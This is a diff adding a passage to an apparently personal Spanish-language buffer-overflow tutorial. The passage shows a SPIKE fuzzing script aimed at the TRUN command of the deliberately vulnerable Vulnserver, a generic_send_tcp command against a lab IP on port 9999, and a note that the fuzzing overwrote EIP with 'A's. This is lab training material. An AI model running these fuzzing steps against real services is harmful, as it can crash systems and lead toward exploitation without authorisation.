@@ -40,9 +40,27 @@ El script en spike que el escribio es el siguiente
 
 Y lo que va a hacer esto es enviar peticiones a cada una de las  funciones del vuln server. (por defecto esta escuchando en el puerto 9999 el VULN server)
 
+```
+s_readline();
+s_string("TRUN ");
+s_string_variable("0");
 
+```
 
+Ya en mi maquina pues comenzamos con el spike.
 
+```
+./generic_send_tcp 192.168.0.100 9999 something.spk 0 0
+
+```
+
+Nos damos cuenta que algo falla porque.
+
+![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/5f0aaf08-750b-480b-bd24-fc29ea0a3def)
+
+Sobre escribimos el EIP con puras A (41) y de hecho en Kali igual esta la prueba.
+
+![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/aa415ef2-62a9-4886-ae6b-a982e017184e)
 
 
 
